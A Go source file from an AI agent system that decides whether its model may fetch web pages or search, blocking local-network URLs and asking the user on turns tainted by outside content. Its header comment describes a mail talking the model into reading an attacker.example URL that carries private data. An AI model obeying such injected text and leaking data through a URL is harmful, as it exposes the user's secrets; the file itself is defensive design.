package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/netip"
	"net/url"
	"strconv"
	"strings"
	"time"
)

// The brain's web, as decided in the study "Recherche web du cerveau"
// (2026-10-27). It searches with its harness's own search (Codex is held to
// its cached index by the node; OpenCode has none). It reads a page with its harness's reader, and
// every read comes here, since a URL is also a way out: a brain talked into
// it by a mail could "read" https://attacker.example/?q=<something private>.
//
//   - a URL that is not http(s), or names this machine or the local network
//     (localhost, a private or loopback IP, a name without a dot), is refused:
//     the node's egress relay enforces it for every task, this is defence in
//     depth;
//   - on a clean turn, the read goes by the web's value (Settings → Tools);
//   - on a tainted turn, it is mine to decide on a card, which never holds
//     the brain; a yes lets it read that page once. The URL written in my own
//     message of this turn is free: I chose it, the brain added nothing to it.
//
// A read is itself external content: it taints the turn (turnTaint).

// noWebSearchLine tells a brain whose harness has no web search of its own.
const noWebSearchLine = "Ton harnais n'a pas de recherche web : si une demande en a besoin, dis-le en une ligne et propose une tâche (`run_task`) ou une adresse à lire."

// webFetchTool is the name every harness's page reader reaches eriphe-core
// under (OpenCode's webfetch is renamed by the node).
const webFetchTool = "WebFetch"

// webSearchTool is the harness's own search.
const webSearchTool = "WebSearch"

// webURL is the URL of a page read's input.
func webURL(input any) string {
	in, _ := input.(map[string]any)
	u, _ := in["url"].(string)
	return strings.TrimSpace(u)
}

// pendingFetches counts the page reads a brain's permissions wait on, by URL.
// A catalog call waiting is counted too, by callKey: it has not run, so it
// has read nothing yet (eventsTaint).
func pendingFetches(perms []map[string]any) map[string]int {
	out := map[string]int{}
	for _, p := range perms {
		switch name := fmt.Sprint(p["tool_name"]); {
		case name == webFetchTool:
			out[webURL(p["input"])]++
		case strings.HasPrefix(name, "mcp__"):
			out[callKey(name, p["input"])]++
		}
	}
	return out
}

// callKey names one catalog call: its tool and its input.
func callKey(name string, input any) string {
	raw, _ := json.Marshal(input)
	return name + " " + string(raw)
}

// brainFetch decides a brain's page read (see above).
func (c *core) brainFetch(ctx context.Context, t *TaskRow, pid string, input map[string]any, pending map[string]int) error {
	raw := webURL(input)
	if why := localURL(raw); why != "" {
		log.Printf("brain: WebFetch %s refused: %s", truncate(raw, 200), why)
		no := false
		_, err := c.answer(ctx, t.ID, pid, "Refusé par la politique d'Eriphe : "+why+".", &no, byPolicy)
		return err
	}
	value := c.webValue()
	if value == gridNever {
		return c.refuseWeb(ctx, t, pid)
	}
	if value == gridApproval || len(c.turnTaintBut(pending)) > 0 {
		if !c.ownerWroteURL(raw) && !c.usePageYes(raw) {
			return c.brainFetchAsk(ctx, t, pid, raw, input, pending)
		}
	}
	log.Printf("brain: WebFetch %s allowed", truncate(raw, 200))
	yes := true
	_, err := c.answer(ctx, t.ID, pid, "", &yes, byPolicy)
	return err
}

// The web is a tool of the list (Settings → Tools): Free, On approval or
// Never, for the brain. Free asks on a tainted turn, as any write: a URL is a
// way out. A search stays free there, or web research would be a card each
// step. A task's web is its container's: what it is lent is what it can lose.
const webValueKey = "web_access"

// webValue is the web's value, Free by default.
func (c *core) webValue() string {
	switch v := c.store.get(webValueKey); v {
	case gridApproval, gridNever:
		return v
	}
	return gridFree
}

func (c *core) setWebValue(v string) error {
	if v != gridFree && v != gridApproval && v != gridNever {
		return fmt.Errorf("%q is not a value of the web", v)
	}
	c.store.set(webValueKey, v)
	return nil
}

func (c *core) refuseWeb(ctx context.Context, t *TaskRow, pid string) error {
	no := false
	_, err := c.answer(ctx, t.ID, pid, "Refusé : le web est coupé pour toi dans Réglages → Outils. Dis-le si une demande en a besoin.", &no, byPolicy)
	return err
}

// brainSearch decides a brain's web search.
func (c *core) brainSearch(ctx context.Context, t *TaskRow, pid string, input map[string]any, pending map[string]int) error {
	query := webSearchQuery(input)
	switch c.webValue() {
	case gridNever:
		return c.refuseWeb(ctx, t, pid)
	case gridApproval:
		if !c.usePageYes(query) {
			return c.askBrainAccess(ctx, t, pid, webSearchTool, input, pending)
		}
	}
	yes := true
	_, err := c.answer(ctx, t.ID, pid, "", &yes, byPolicy)
	return err
}

// webSearchQuery is what a search asks.
func webSearchQuery(input map[string]any) string {
	query, _ := input["query"].(string)
	return query
}

// brainFetchAsk hands a page read to me, on a card like any call.
func (c *core) brainFetchAsk(ctx context.Context, t *TaskRow, pid, raw string, input map[string]any, pending map[string]int) error {
	log.Printf("brain: WebFetch %s is the user's decision", truncate(raw, 200))
	return c.askBrainAccess(ctx, t, pid, webFetchTool, input, pending)
}

// pageYesTTL is how long a yes on a page read waits for the brain to read it.
const pageYesTTL = time.Hour

func pageYesKey(raw string) string { return "page_yes:" + raw }

// usePageYes consumes the yes given to that page, if there is one.
func (c *core) usePageYes(raw string) bool {
	at, err := strconv.ParseInt(c.store.get(pageYesKey(raw)), 10, 64)
	if err != nil {
		return false
	}
	c.store.set(pageYesKey(raw), "")
	return time.Since(time.Unix(at, 0)) < pageYesTTL
}

// allowPage answers a yes on a page read: the page is read by the brain's own
// reader, so the yes lets its next read of that URL through.
func (c *core) allowPage(a accessQuestion) string {
	var input map[string]any
	json.Unmarshal([]byte(a.Input), &input)
	if strings.HasPrefix(a.Call, webSearchTool+" ") {
		query := webSearchQuery(input)
		c.store.set(pageYesKey(query), strconv.FormatInt(time.Now().Unix(), 10))
		return fmt.Sprintf("%s a dit oui : tu peux chercher « %s ». Lance cette recherche maintenant, une seule fois.", c.conf().User, query)
	}
	raw := webURL(input)
	c.store.set(pageYesKey(raw), strconv.FormatInt(time.Now().Unix(), 10))
	return fmt.Sprintf("%s a dit oui : tu peux lire la page %s. Lis-la maintenant avec ton outil web, une seule fois, et dis-lui ce qu'il voulait savoir.", c.conf().User, raw)
}

// ownerWroteURL tells whether a URL is written in one of my messages of the
// brain's current turn (with or without its scheme or a final slash).
func (c *core) ownerWroteURL(raw string) bool {
	from, to, _, _ := c.turn.snapshot()
	if from <= 0 || to < from || raw == "" {
		return false
	}
	bare := strings.TrimSuffix(raw, "/")
	if s, ok := strings.CutPrefix(bare, "https://"); ok {
		bare = s
	} else if s, ok := strings.CutPrefix(bare, "http://"); ok {
		bare = s
	}
	if len(bare) < 4 || !strings.Contains(bare, ".") {
		return false
	}
	msgs, err := c.store.messagesAfter(from-1, to-from+1)
	if err != nil {
		return false
	}
	for _, m := range msgs {
		if m.Seq >= from && m.Seq <= to && m.Role == roleUser && strings.Contains(m.Text, bare) {
			return true
		}
	}
	return false
}

// localURL tells why a URL must not be read from the brain's node: it is
// not http(s), or it names this machine or the local network. Only what
// can be told without a lookup: a name that resolves to a private address
// is the egress relay's to stop.
func localURL(raw string) string {
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return "adresse illisible"
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return "seuls http et https se lisent"
	}
	if u.User != nil {
		return "une adresse avec identifiants ne se lit pas"
	}
	host := strings.TrimSuffix(strings.ToLower(u.Hostname()), ".")
	const local = "le réseau local et cette machine ne se lisent pas"
	if ip, err := netip.ParseAddr(strings.Trim(host, "[]")); err == nil {
		ip = ip.Unmap()
		if !ip.IsGlobalUnicast() || ip.IsPrivate() || ip.IsLoopback() || cgnat.Contains(ip) {
			return local
		}
		return ""
	}
	if !strings.Contains(host, ".") {
		return local // localhost, a machine's name on the network, or an IP in another notation
	}
	for _, suffix := range []string{".localhost", ".local", ".lan", ".home", ".internal", ".intranet", ".home.arpa", ".localdomain"} {
		if strings.HasSuffix(host, suffix) {
			return local
		}
	}
	// 127.1, 0x7f.0.0.1, 010.0.0.1: an IP the parser does not take is
	// still one to the resolver.
	if strings.Trim(host, "0123456789.") == "" || strings.HasPrefix(host, "0x") || strings.Contains(host, ".0x") {
		return local
	}
	return ""
}

// cgnat is the shared address space (RFC 6598), Tailscale's among others.
var cgnat = netip.MustParsePrefix("100.64.0.0/10")
